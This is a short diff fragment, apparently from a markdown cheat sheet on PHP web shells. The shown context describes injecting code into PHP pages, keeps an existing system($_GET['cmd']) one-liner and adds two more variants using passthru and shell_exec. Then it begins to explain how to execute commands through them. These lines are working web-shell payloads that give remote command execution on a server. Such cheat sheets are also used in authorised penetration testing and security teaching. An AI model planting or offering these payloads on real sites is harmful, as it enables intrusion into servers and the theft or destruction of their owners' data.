@@ -5,6 +5,8 @@
 This code can be injected into pages that use php.
 ```
 <?php system($_GET['cmd']); ?>
+<?php passthru($_GET['cmd']); ?>
+<?php echo shell_exec("whoami");?>
 ```
 
 You can then call then execute the commands like this:
